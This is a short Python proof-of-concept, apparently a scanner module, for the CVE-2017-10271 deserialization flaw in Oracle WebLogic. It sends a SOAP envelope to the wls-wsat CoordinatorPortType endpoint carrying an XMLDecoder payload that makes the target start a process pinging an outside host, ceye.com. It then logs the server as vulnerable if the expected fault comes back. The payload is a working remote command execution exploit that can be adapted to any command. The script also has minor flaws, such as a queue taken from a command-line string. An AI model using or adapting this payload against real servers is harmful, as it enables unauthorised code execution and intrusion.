# _*_ coding:utf-8 _*_

import sys
import requests
import re
import logging

logging.basicConfig(filename='Weblogic.log',
                    format='%(asctime)s %(message)s',
                    filemode="w", level=logging.INFO)

VUL=['CVE_2017_10271']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(url,index,q):
    rurl=url
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        logging.info('[+]{}  deserialization vulnerability:{}.'.format(rurl,VUL[index]))
        q.put('[+]{}  deserialization vulnerability:{}.'.format(rurl,VUL[index]))
    else:
        logging.info('[-]{} not detected {}.'.format(rurl,VUL[index]))


def run(rip,rport,index,queue):
    url=rip+':'+str(rport)
    poc(url=url,index=index,q=queue)

if __name__ == '__main__':
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    queue = sys.argv[4]
    run(dip,dport,0,queue)